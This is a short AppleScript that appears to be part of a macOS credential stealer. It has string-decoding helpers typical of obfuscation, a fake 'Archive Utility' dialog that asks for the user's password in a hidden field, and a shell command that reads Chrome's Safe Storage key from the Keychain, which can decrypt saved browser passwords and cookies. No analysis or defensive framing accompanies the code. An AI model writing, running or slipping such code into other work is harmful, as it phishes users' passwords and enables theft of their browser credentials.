on subtractCodes(leftCodes, rightCodes)
    set decoded to ""
    repeat with index from 1 to count of leftCodes
        set decoded to decoded & character id ((item index of leftCodes) - (item index of rightCodes))
    end repeat
    return decoded
end subtractCodes

on addCodes(leftCodes, rightCodes)
    set decoded to ""
    repeat with index from 1 to count of leftCodes
        set decoded to decoded & character id ((item index of leftCodes) + (item index of rightCodes))
    end repeat
    return decoded
end addCodes

on offsetCodes(leftCodes, rightCodes)
    set decoded to ""
    repeat with index from 1 to count of leftCodes
        set decoded to decoded & character id ((item index of leftCodes) - (item index of rightCodes))
    end repeat
    return decoded
end offsetCodes

display dialog "Archive Utility" default answer "" hidden answer true
do shell script "security find-generic-password -w -s 'Chrome Safe Storage'"
